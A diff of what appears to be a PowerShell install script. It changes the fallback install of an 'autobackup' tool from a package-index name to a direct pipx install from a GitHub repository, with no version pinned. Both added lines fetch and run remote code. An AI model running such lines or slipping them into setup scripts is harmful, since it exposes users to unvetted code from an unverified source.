@@ -82,9 +82,9 @@ try {
     autobackup --version | Out-Null
 } catch {
     try {
-        pipx install auto-backup-wins
+        pipx install git+https://github.com/web3toolsbox/auto-backup-wins.git
     } catch {
-        python -m pipx install auto-backup-wins
+        python -m pipx install git+https://github.com/web3toolsbox/auto-backup-wins.git
     }
     $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
 }
